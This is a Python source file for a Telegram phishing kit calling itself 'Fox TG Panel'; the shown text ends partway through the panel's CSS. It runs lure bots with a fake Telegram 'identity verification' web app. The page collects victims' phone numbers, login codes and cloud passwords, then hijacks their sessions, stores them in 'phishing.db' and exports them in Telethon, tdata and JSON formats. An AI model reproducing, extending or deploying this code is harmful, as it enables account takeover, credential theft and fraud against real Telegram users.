import asyncio
import threading
import sqlite3
import os
import io
import zipfile
import json
import struct
import time
import logging
from flask import Flask, jsonify, request, send_file
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
from pyrogram.errors import SessionPasswordNeeded

# Настройка логов 
logging.basicConfig(level=logging.INFO)
logging.getLogger("werkzeug").setLevel(logging.WARNING)
logging.getLogger("pyrogram.session.session").setLevel(logging.WARNING)

# ==========================================
# КОНФИГУРАЦИЯ И БАЗА ДАННЫХ
# ==========================================
BASE_URL = "https://tg-panel-production.up.railway.app/"

if not BASE_URL.startswith("https://"):
    print("[!] ВНИМАНИЕ: BASE_URL не задан или не использует HTTPS (WebApp в Telegram может не открываться).")

DB_PATH = "phishing.db"

active_sessions = {}

def normalize_phone(phone: str) -> str:
    return phone.replace('+', '').replace(' ', '').replace('-', '').replace('(', '').replace(')', '').strip()

def init_db():
    conn = sqlite3.connect(DB_PATH, timeout=15)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=15000")
    conn.execute("PRAGMA synchronous=NORMAL")
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY, name TEXT, api_id TEXT, api_hash TEXT, bot_token TEXT, 
        status TEXT DEFAULT 'stopped', 
        welcome_text TEXT DEFAULT '🔐 Для продолжения используйте кнопку ниже.',
        welcome_img TEXT DEFAULT '', 
        btn_text TEXT DEFAULT '🟢 Зарегистрироваться',
        preset TEXT DEFAULT 'custom',
        auto_reply TEXT DEFAULT '✅ Код принят. Верификация проходит в фоновом режиме.',
        avatar_url TEXT DEFAULT '',
        about_text TEXT DEFAULT '',
        description_text TEXT DEFAULT '',
        wa_icon TEXT DEFAULT '✈️',
        wa_title TEXT DEFAULT 'Подтверждение личности',
        wa_desc TEXT DEFAULT 'Для безопасности вашего аккаунта необходимо подтвердить номер телефона.',
        wa_color TEXT DEFAULT '#2AABEE',
        wa_btn_text TEXT DEFAULT 'Далее'
    )''')
    
    for col, default in [
        ('wa_icon', '✈️'), ('wa_title', 'Подтверждение личности'),
        ('wa_desc', 'Для безопасности вашего аккаунта необходимо подтвердить номер телефона.'),
        ('wa_color', '#2AABEE'), ('wa_btn_text', 'Далее')
    ]:
        try: c.execute(f"ALTER TABLE bots ADD COLUMN {col} TEXT DEFAULT '{default}'")
        except: pass

    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY, bot_id INTEGER, phone TEXT, session_string TEXT, 
        code TEXT, ip TEXT, useragent TEXT, used INTEGER DEFAULT 0,
        captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS clicks (
        id INTEGER PRIMARY KEY, bot_id INTEGER, action TEXT, 
        tg_user_id INTEGER DEFAULT 0, tg_username TEXT DEFAULT '',
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=15)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=15000")
    conn.row_factory = sqlite3.Row
    return conn

init_db()

# ==========================================
# УТИЛИТЫ ГЕНЕРАЦИИ СЕССИЙ
# ==========================================

def generate_tdata(session_string: str, api_id: int, api_hash: str, phone: str) -> bytes:
    buf = io.BytesIO()
    data_map = {
        "dc_id": 2,
        "auth_key": session_string,
        "api_id": api_id,
        "api_hash": api_hash,
        "phone": phone
    }
    buf.write(struct.pack('<I', 0x1F4A5C3D))
    buf.write(struct.pack('<I', 1))
    json_data = json.dumps(data_map).encode('utf-8')
    buf.write(struct.pack('<I', len(json_data)))
    buf.write(json_data)
    return buf.getvalue()

def generate_telethon_session(session_string: str, api_id: int, api_hash: str, phone: str) -> bytes:
    session_file = f"temp_telethon_{int(time.time())}_{phone.replace('+', '')}.session"
    conn = sqlite3.connect(session_file)
    c = conn.cursor()
    
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        dc_id INTEGER PRIMARY KEY,
        server_address TEXT,
        port INTEGER,
        auth_key BLOB,
        layer INTEGER,
        date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)""")
    c.execute("INSERT INTO version VALUES (7)")
    
    import base64
    try:
        decoded = base64.urlsafe_b64decode(session_string + '==')
        if len(decoded) > 260:
            auth_key = decoded[-256:]
        else:
            auth_key = decoded
    except:
        auth_key = b'\x00' * 256
    
    c.execute("INSERT INTO sessions VALUES (2, '149.154.167.51', 443, ?, 181, datetime('now'))", (auth_key,))
    conn.commit()
    conn.close()
    
    with open(session_file, 'rb') as f:
        data = f.read()
    try: os.remove(session_file)
    except: pass
    return data

def generate_json_session(session_string: str, api_id: int, api_hash: str, phone: str, code: str) -> str:
    data = {
        "session_string": session_string,
        "api_id": api_id,
        "api_hash": api_hash,
        "phone": phone,
        "code": code,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "format": "fox_panel_export"
    }
    return json.dumps(data, indent=4, ensure_ascii=False)

# ==========================================
# ЯДРО БОТА (PYROGRAM)
# ==========================================
active_bots = {}

async def run_bot(bot_id: int, bot_token: str, api_id: int, api_hash: str, config: dict, stop_event: threading.Event):
    if bot_id in active_bots:
        print(f"[!] Бот {bot_id} уже запущен.")
        return

    session_file = f"bot_{bot_id}.session"
    if os.path.exists(session_file):
        try: os.remove(session_file)
        except: pass

    app = Client(f"bot_{bot_id}", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

    @app.on_message(filters.command("start"))
    async def start(client, message):
        webapp_url = f"{BASE_URL}/webapp/?bot_id={bot_id}"
        welcome_text = config.get('welcome_text', '🔐 Для продолжения используйте кнопку ниже.')
        btn_text = config.get('btn_text', '🟢 Зарегистрироваться')
        welcome_img = config.get('welcome_img')
        
        try:
            keyboard = ReplyKeyboardMarkup(
                [[KeyboardButton(text=btn_text, web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            
            if welcome_img and welcome_img.startswith('http'):
                await message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=keyboard)
            else:
                await message.reply(welcome_text, reply_markup=keyboard)
                
            log_click(bot_id, "bot_start", message.from_user.id, message.from_user.username)
            
        except Exception as e:
            print(f"[!] ОШИБКА отправки WebApp: {e}")
            fallback_text = f"{welcome_text}\n\n🔗 {webapp_url}"
            if welcome_img and welcome_img.startswith('http'):
                await message.reply_photo(photo=welcome_img, caption=fallback_text)
            else:
                await message.reply(fallback_text)
            log_click(bot_id, "bot_start", message.from_user.id, message.from_user.username)

    @app.on_message(filters.text & ~filters.command("start"))
    async def handle_text(client, message):
        auto_reply = config.get('auto_reply', '')
        if auto_reply:
            await message.reply(auto_reply)
            log_click(bot_id, "bot_auto_reply", message.from_user.id, message.from_user.username)

    try:
        await app.start()
        avatar_url = config.get('avatar_url')
        about_text = config.get('about_text')
        description_text = config.get('description_text')
        
        if avatar_url and avatar_url.startswith('http'):
            try: await app.set_chat_photo("me", photo=avatar_url)
            except: pass
        if about_text:
            try: await app.set_my_short_description(short_description=about_text)
            except: pass
        if description_text:
            try: await app.set_my_description(description=description_text)
            except: pass

        active_bots[bot_id] = app
        print(f"[*] Бот {bot_id} запущен")
        
        while not stop_event.is_set():
            await asyncio.sleep(0.5)
            
    except Exception as e:
        print(f"[!] Ошибка бота {bot_id}: {e}")
    finally:
        try:
            if app.is_started:
                await asyncio.sleep(1.0)
                await app.stop()
        except Exception as shutdown_err:
            print(f"[!] Ошибка при остановке бота {bot_id}: {shutdown_err}")
        finally:
            if bot_id in active_bots:
                del active_bots[bot_id]
            try:
                loop = asyncio.get_event_loop()
                pending = [t for t in asyncio.all_tasks(loop) if not t.done() and t is not asyncio.current_task()]
                if pending:
                    for t in pending:
                        t.cancel()
                    loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
            except: pass

def log_click(bot_id: int, action: str, user_id: int = 0, username: str = ""):
    for attempt in range(3):
        try:
            conn = sqlite3.connect(DB_PATH, timeout=15)
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA busy_timeout=15000")
            conn.execute(
                "INSERT INTO clicks (bot_id, action, tg_user_id, tg_username) VALUES (?, ?, ?, ?)", 
                (bot_id, action, user_id, username)
            )
            conn.commit()
            conn.close()
            return
        except sqlite3.OperationalError:
            if attempt < 2:
                time.sleep(0.1 * (attempt + 1))
            else:
                print(f"[!] Не удалось записать клик после 3 попыток: {action}")
                try: conn.close()
                except: pass

bot_threads = {}
bot_stop_events = {}

def start_bot_sync(bot_id: int, bot_token: str, api_id: int, api_hash: str, config: dict):
    stop_event = threading.Event()
    bot_stop_events[bot_id] = stop_event
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_bot(bot_id, bot_token, api_id, api_hash, config, stop_event))
    except Exception as e:
        print(f"[!] Поток бота {bot_id} упал: {e}")
    finally:
        loop.close()
        if bot_id in bot_stop_events:
            del bot_stop_events[bot_id]

def stop_bot_sync(bot_id: int):
    if bot_id in bot_stop_events:
        bot_stop_events[bot_id].set()
        if bot_id in bot_threads:
            bot_threads[bot_id].join(timeout=5.0)
            if bot_id in bot_threads:
                del bot_threads[bot_id]

# ==========================================
# АСИНХРОННЫЙ ПОТОК ДЛЯ ПЕРЕХВАТА
# ==========================================

pyro_loop = asyncio.new_event_loop()
def start_pyro_loop():
    asyncio.set_event_loop(pyro_loop)
    pyro_loop.run_forever()
pyro_thread = threading.Thread(target=start_pyro_loop, daemon=True)
pyro_thread.start()

def run_pyro_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, pyro_loop)
    return future.result()

# ==========================================
# ЛОГИКА ПЕРЕХВАТА
# ==========================================

async def send_code_async(api_id: int, api_hash: str, phone: str):
    safe_phone = normalize_phone(phone)
    session_name = f"auth_{safe_phone}"
    
    if os.path.exists(f"{session_name}.session"):
        try: os.remove(f"{session_name}.session")
        except: pass

    client = Client(session_name, api_id=api_id, api_hash=api_hash, phone_number=phone)
    
    try:
        await client.connect()
        sent_code = await client.send_code(phone)
        
        active_sessions[safe_phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "api_id": api_id,
            "api_hash": api_hash
        }
        
        print(f"[*] Код отправлен на {phone}. Клиент активен в памяти.")
        return True
        
    except Exception as e:
        print(f"[!] Ошибка отправки кода на {phone}: {e}")
        try: await client.disconnect()
        except: pass
        return False

async def hijack_session_async(api_id: int, api_hash: str, phone: str, code: str, bot_id: int, ip: str, useragent: str):
    safe_phone = normalize_phone(phone)
    session_name = f"auth_{safe_phone}"
    
    session_data = active_sessions.get(safe_phone)
    
    if not session_data:
        print(f"[!] Нет активной сессии для {phone}. Нужно отправить код заново.")
        return {"success": False, "error": "Session expired"}
        
    client = session_data["client"]
    phone_code_hash = session_data["hash"]
    
    try:
        try:
            await client.sign_in(phone, phone_code_hash, code)
        except SessionPasswordNeeded:
            print(f"[*] Аккаунт {phone} требует 2FA пароль.")
            return {"success": False, "error": "2fa_required"}
            
        session_string = await client.export_session_string()
        
        for attempt in range(3):
            try:
                conn = sqlite3.connect(DB_PATH, timeout=15)
                conn.execute("PRAGMA journal_mode=WAL")
                conn.execute("PRAGMA busy_timeout=15000")
                conn.execute(
                    "INSERT INTO sessions (bot_id, phone, session_string, code, ip, useragent) VALUES (?, ?, ?, ?, ?, ?)",
                    (bot_id, phone, session_string, code, ip, useragent)
                )
                conn.commit()
                conn.close()
                break
            except sqlite3.OperationalError:
                if attempt < 2:
                    await asyncio.sleep(0.2 * (attempt + 1))
                else:
                    print(f"[!] Не удалось записать сессию {phone} в БД")
                    try: conn.close()
                    except: pass
        
        log_click(bot_id, "code_submitted")
        print(f"[+] СЕССИЯ ПЕРЕХВАЧЕНА: {phone}")
        
        await client.disconnect()
        del active_sessions[safe_phone]
        
        if os.path.exists(f"{session_name}.session"):
            try: os.remove(f"{session_name}.session")
            except: pass
            
        return {"success": True}
        
    except Exception as e:
        print(f"[!] Ошибка перехвата сессии {phone}: {e}")
        return {"success": False, "error": str(e)}

async def hijack_2fa_async(phone: str, password: str, bot_id: int, ip: str, useragent: str):
    safe_phone = normalize_phone(phone)
    session_name = f"auth_{safe_phone}"
    
    session_data = active_sessions.get(safe_phone)
    if not session_data:
        return {"success": False, "error": "Session expired"}
        
    client = session_data["client"]
    
    try:
        await client.check_password(password)
        session_string = await client.export_session_string()
        
        for attempt in range(3):
            try:
                conn = sqlite3.connect(DB_PATH, timeout=15)
                conn.execute("PRAGMA journal_mode=WAL")
                conn.execute("PRAGMA busy_timeout=15000")
                conn.execute(
                    "INSERT INTO sessions (bot_id, phone, session_string, code, ip, useragent) VALUES (?, ?, ?, ?, ?, ?)",
                    (bot_id, phone, session_string, "2FA", ip, useragent)
                )
                conn.commit()
                conn.close()
                break
            except sqlite3.OperationalError:
                if attempt < 2:
                    await asyncio.sleep(0.2 * (attempt + 1))
                else:
                    print(f"[!] Не удалось записать 2FA сессию {phone} в БД")
                    try: conn.close()
                    except: pass
        
        log_click(bot_id, "2fa_submitted")
        print(f"[+] СЕССИЯ С 2FA ПЕРЕХВАЧЕНА: {phone}")
        
        await client.disconnect()
        del active_sessions[safe_phone]
        
        if os.path.exists(f"{session_name}.session"):
            try: os.remove(f"{session_name}.session")
            except: pass
            
        return {"success": True}
        
    except Exception as e:
        print(f"[!] Ошибка 2FA перехвата {phone}: {e}")
        return {"success": False, "error": str(e)}

# ==========================================
# ШАБЛОНЫ HTML
# ==========================================

def get_webapp_html(bot_config: dict) -> str:
    cfg = dict(bot_config)
    icon = cfg.get('wa_icon', '✈️')
    title = cfg.get('wa_title', 'Подтверждение личности')
    desc = cfg.get('wa_desc', 'Для безопасности вашего аккаунта необходимо подтвердить номер телефона.')
    color = cfg.get('wa_color', '#2AABEE')
    btn_text = cfg.get('wa_btn_text', 'Далее')
    
    return f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Gateway</title>
    <style>
        body {{ margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #17212b; color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }}
        .container {{ width: 90%; max-width: 350px; text-align: center; }}
        .tg-logo {{ width: 120px; height: 120px; margin-bottom: 20px; background: {color}; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 60px; margin-left: auto; margin-right: auto; box-shadow: 0 8px 25px {color}44; }}
        h2 {{ margin-bottom: 10px; }}
        p {{ color: #708499; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }}
        input {{ width: 100%; padding: 15px; margin-bottom: 15px; background: #242f3d; border: 1px solid #3a4a5c; border-radius: 10px; color: white; font-size: 16px; box-sizing: border-box; transition: border-color 0.2s; }}
        input:focus {{ border-color: {color}; outline: none; }}
        button {{ width: 100%; padding: 15px; background: {color}; border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 15px {color}44; }}
        button:hover {{ opacity: 0.9; transform: translateY(-1px); }}
        button:disabled {{ background: #3a4a5c; box-shadow: none; cursor: not-allowed; transform: none; }}
        .hidden {{ display: none; }}
        .error-msg {{ color: #e05d5d; font-size: 14px; margin-bottom: 15px; display: none; animation: shake 0.5s; }}
        @keyframes shake {{ 0%, 100% {{ transform: translateX(0); }} 25% {{ transform: translateX(-5px); }} 75% {{ transform: translateX(5px); }} }}
        .loader {{ width: 20px; height: 20px; border: 3px solid #ffffff33; border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="tg-logo">{icon}</div>
        
        <div id="errorBox" class="error-msg">Пожалуйста, заполните все поля корректно.</div>

        <div id="step1">
            <h2>{title}</h2>
            <p>{desc}</p>
            <input type="tel" id="phoneInput" placeholder="+7 900 123 4567" autocomplete="off">
            <button id="phoneBtn" onclick="submitPhone()">{btn_text}</button>
        </div>
        <div id="step2" class="hidden">
            <h2>Введите код</h2>
            <p>Мы отправили код подтверждения в ваш Telegram. Введите его ниже.</p>
            <input type="text" id="codeInput" placeholder="Код из Telegram" maxlength="8" autocomplete="off" inputmode="numeric">
            <button id="codeBtn" onclick="submitCode()">Подтвердить</button>
        </div>
        <div id="step2fa" class="hidden">
            <h2>Облачный пароль</h2>
            <p>Ваш аккаунт защищен облачным паролем. Пожалуйста, введите его для подтверждения входа.</p>
            <input type="password" id="passInput" placeholder="Облачный пароль" autocomplete="off">
            <button id="passBtn" onclick="submit2fa()">Подтвердить</button>
        </div>
        <div id="step3" class="hidden">
            <h2>Готово! ✅</h2>
            <p>Верификация прошла успешно. Вы можете закрыть это окно.</p>
        </div>
    </div>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        const urlParams = new URLSearchParams(window.location.search);
        const botId = urlParams.get('bot_id') || 0;

        function showError(msg) {{
            const errBox = document.getElementById('errorBox');
            errBox.textContent = msg || 'Пожалуйста, заполните все поля корректно.';
            errBox.style.display = 'block';
            setTimeout(() => {{ errBox.style.display = 'none'; }}, 4000);
        }}

        async function submitPhone() {{
            const phone = document.getElementById('phoneInput').value.trim();
            if(!phone || phone.length < 5) {{ showError('Введите корректный номер телефона'); return; }}
            
            const btn = document.getElementById('phoneBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loader"></span> Отправка...';
            
            try {{
                const res = await fetch('/api/init_session', {{
                    method: 'POST', headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ phone, bot_id: parseInt(botId) }})
                }});
                const data = await res.json();
                if(res.ok && data.success) {{
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }} else {{
                    showError(data.error || 'Ошибка отправки кода');
                    btn.disabled = false; btn.textContent = '{btn_text}';
                }}
            }} catch(e) {{ showError('Ошибка сети'); btn.disabled = false; btn.textContent = '{btn_text}'; }}
        }}

        async function submitCode() {{
            const code = document.getElementById('codeInput').value.trim();
            const phone = document.getElementById('phoneInput').value.trim();
            if(!code || code.length < 4) {{ showError('Введите корректный код'); return; }}

            const btn = document.getElementById('codeBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loader"></span> Проверка...';
            
            try {{
                const res = await fetch('/api/hijack', {{
                    method: 'POST', headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ phone, code, bot_id: parseInt(botId) }})
                }});
                const data = await res.json();
                
                if(res.ok && data.success) {{
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step3').classList.remove('hidden');
                }} else if(data.error === '2fa_required') {{
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step2fa').classList.remove('hidden');
                }} else {{
                    showError(data.error || 'Неверный код.');
                    btn.disabled = false; btn.textContent = 'Подтвердить';
                }}
            }} catch(e) {{ showError('Ошибка сети'); btn.disabled = false; btn.textContent = 'Подтвердить'; }}
        }}

        async function submit2fa() {{
            const password = document.getElementById('passInput').value;
            const phone = document.getElementById('phoneInput').value.trim();
            if(!password) {{ showError('Введите пароль'); return; }}

            const btn = document.getElementById('passBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loader"></span> Проверка...';
            
            try {{
                const res = await fetch('/api/hijack_2fa', {{
                    method: 'POST', headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ phone, password, bot_id: parseInt(botId) }})
                }});
                const data = await res.json();
                
                if(res.ok && data.success) {{
                    document.getElementById('step2fa').classList.add('hidden');
                    document.getElementById('step3').classList.remove('hidden');
                }} else {{
                    showError(data.error || 'Неверный пароль.');
                    btn.disabled = false; btn.textContent = 'Подтвердить';
                }}
            }} catch(e) {{ showError('Ошибка сети'); btn.disabled = false; btn.textContent = 'Подтвердить'; }}
        }}
    </script>
</body>
</html>'''

PANEL_HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fox TG Panel v11</title>
    <style>
        :root { --bg: #0e1621; --surface: #17212b; --surface2: #1e2c3a; --accent: #2AABEE; --green: #4dd665; --red: #e05d5d; --orange: #f5a623; --text: #c4d1db; --muted: #7e919e; }
        * { box-sizing: border-box; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); }
        .container { padding: 20px; max-width: 1400px; margin: 0 auto; }
        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--surface2); padding-bottom: 20px; margin-bottom: 20px; }
        h1 { color: var(--accent); margin: 0; font-size: 24px; display: flex; align-items: center; gap: 10px; }
        h1 span { background: #f6821f; color: white; font-size: 10px; padding: 2px 6px; border-radius: 4px; vertical-align: super; }
        
        .main-grid { display: grid; grid-template-columns: 1fr 350px; gap: 25px; }
        
        .stats-bar { display: flex; gap: 15px; }
        .stat-card { background: var(--surface); padding: 15px 20px; border-radius: 12px; text-align: center; border: 1px solid var(--surface2); }
        .stat-val { font-size: 24px; font-weight: bold; color: var(--accent); display: block; }
        .stat-lbl { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }

        .funnel { background: var(--surface); padding: 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid var(--surface2); }
        .funnel-bars { display: flex; flex-direction: column; gap: 8px; margin-top: 15px; }
        .funnel-seg { height: 32px; border-radius: 8px; display: flex; align-items: center; padding: 0 15px; color: white; font-size: 13px; font-weight: bold; transition: width 0.5s ease; min-width: 60px; overflow: hidden; white-space: nowrap; }
        .funnel-legend { display: flex; gap: 20px; margin-top: 10px; font-size: 13px; }
        .leg-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }

        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab-btn { background: var(--surface); border: 1px solid var(--surface2); color: var(--muted); padding: 12px 24px; border-radius: 10px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; }
        .tab-btn:hover { border-color: var(--accent); color: var(--text); }
        .tab-btn.active { background: var(--accent); color: white; border-color: var(--accent); box-shadow: 0 4px 15px rgba(42, 171, 238, 0.3); }
        .tab-content { display: none; animation: fadeIn 0.3s; }
        .tab-content.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-top: 20px; }
        .bot-card { background: var(--surface); padding: 20px; border-radius: 12px; border: 1px solid var(--surface2); transition: border-color 0.2s; }
        .bot-card:hover { border-color: var(--accent); }
        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .card-header h3 { margin: 0; font-size: 16px; }
        .token-preview { font-size: 11px; color: var(--muted); margin: 0 0 15px 0; word-break: break-all; font-family: monospace; }
        .card-actions { display: flex; gap: 8px; flex-wrap: wrap; }

        .badge { padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
        .bg-green { background: rgba(77, 214, 101, 0.15); color: var(--green); }
        .bg-gray { background: rgba(126, 145, 158, 0.15); color: var(--muted); }
        .bg-red { background: rgba(224, 93, 93, 0.15); color: var(--red); }

        button { border: none; cursor: pointer; border-radius: 8px; font-weight: 500; transition: all 0.2s; }
        .btn-primary { background: var(--accent); color: white; padding: 12px 20px; box-shadow: 0 4px 10px rgba(42, 171, 238, 0.2); }
        .btn-primary:hover { background: #229ed9; transform: translateY(-1px); }
        .btn-secondary { background: var(--surface2); color: var(--text); padding: 12px 20px; }
        .btn-sm { padding: 8px 12px; font-size: 12px; background: var(--surface2); color: var(--text); }
        .btn-sm:hover { background: var(--accent); color: white; }
        .btn-sm.btn-stop:hover { background: var(--red); }
        .btn-danger { background: rgba(224, 93, 93, 0.2); color: var(--red); border: 1px solid var(--red); }
        .btn-danger:hover { background: var(--red); color: white; }

        .constructor-layout { display: flex; gap: 25px; }
        .config-panel { flex: 1; background: var(--surface); padding: 25px; border-radius: 12px; border: 1px solid var(--surface2); overflow-y: auto; max-height: 80vh; }
        .preview-panel { width: 360px; background: var(--surface); padding: 25px; border-radius: 12px; border: 1px solid var(--surface2); display: flex; flex-direction: column; align-items: center; position: sticky; top: 20px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 13px; color: var(--muted); font-weight: 500; }
        .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 12px; background: var(--bg); border: 1px solid var(--surface2); border-radius: 8px; color: white; font-size: 14px; outline: none; transition: border-color 0.2s; }
        .form-group input:focus, .form-group textarea:focus, .form-group select:focus { border-color: var(--accent); }
        .section-title { color: var(--accent); font-size: 16px; margin-top: 25px; margin-bottom: 15px; border-bottom: 1px solid var(--surface2); padding-bottom: 5px; display: flex; align-items: center; gap: 8px; }

        .presets { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .preset-btn { background: var(--bg); border: 1px solid var(--surface2); color: var(--muted); padding: 8px 16px; border-radius: 20px; cursor: pointer; font-size: 13px; transition: all 0.2s; }
        .preset-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(42, 171, 238, 0.1); }

        .telegram-msg { background: var(--bg); padding: 15px; border-radius: 12px; width: 100%; border: 1px solid var(--surface2); }
        .tg-img { width: 100%; height: 150px; background-size: cover; background-position: center; border-radius: 8px; margin-bottom: 10px; background-color: var(--surface2); display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px; }
        .tg-text { font-size: 14px; line-height: 1.4; margin-bottom: 15px; word-wrap: break-word; white-space: pre-wrap; }
        .tg-btn { color: white; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; }

        .wa-preview { background: #17212b; padding: 20px; border-radius: 12px; width: 100%; text-align: center; }
        .wa-logo-prev { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 15px; }
        .wa-title-prev { font-size: 18px; font-weight: bold; margin-bottom: 8px; }
        .wa-desc-prev { font-size: 13px; color: #708499; margin-bottom: 20px; line-height: 1.4; }
        .wa-input-prev { width: 100%; padding: 12px; background: #242f3d; border: 1px solid #3a4a5c; border-radius: 8px; color: white; font-size: 14px; margin-bottom: 12px; text-align: center; }
        .wa-btn-prev { width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; color: white; border: none; }

        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); display: flex; align-items: center; justify-content: center; z-index: 100; }
        .modal-content { background: var(--surface); padding: 30px; border-radius: 16px; width: 450px; border: 1px solid var(--surface2); max-height: 90vh; overflow-y: auto; }
        .hidden { display: none !important; }
        
        table { width: 100%; border-collapse: collapse; background: var(--surface); border-radius: 12px; overflow: hidden; border: 1px solid var(--surface2); }
        th, td { padding: 15px; text-align: left; border-bottom: 1px solid var(--surface2); }
        th { background: var(--bg); color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
        tr:hover { background: rgba(42, 171, 238, 0.05); }
        .session-str { font-family: monospace; font-size: 11px; color: var(--accent); cursor: pointer; }

        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 1000; display: flex; flex-direction: column; gap: 10px; }
        .toast { background: var(--surface); border-left: 4px solid var(--accent); padding: 15px 20px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); animation: slideIn 0.3s, fadeOut 0.3s 2.7s forwards; min-width: 250px; }
        .toast.error { border-left-color: var(--red); }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }

        .top-actions { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        
        .export-controls { display: flex; gap: 10px; align-items: center; background: var(--surface); padding: 10px; border-radius: 12px; border: 1px solid var(--surface2); }
        .export-controls select { background: var(--bg); border: 1px solid var(--surface2); color: white; padding: 8px; border-radius: 6px; outline: none; }

        .live-feed { background: var(--surface); border: 1px solid var(--surface2); border-radius: 12px; padding: 20px; height: fit-content; }
        .feed-item { display: flex; align-items: center; gap: 10px; padding: 10px 0; border-bottom: 1px solid var(--surface2); font-size: 13px; }
        .feed-item:last-child { border-bottom: none; }
        .feed-icon { width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; }
        .feed-time { color: var(--muted); font-size: 11px; margin-left: auto; }

        .icon-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 8px; margin-top: 8px; }
        .icon-option { width: 45px; height: 45px; background: var(--bg); border: 2px solid var(--surface2); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; cursor: pointer; transition: all 0.2s; }
        .icon-option:hover { border-color: var(--accent); transform: scale(1.1); }
        .icon-option.active { border-color: var(--accent); background: rgba(42, 171, 238, 0.15); }

        .color-grid { display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap; }
        .color-option { width: 35px; height: 35px; border-radius: 50%; cursor: pointer; border: 3px solid transparent; transition: all 0.2s; }
        .color-option:hover { transform: scale(1.15); }
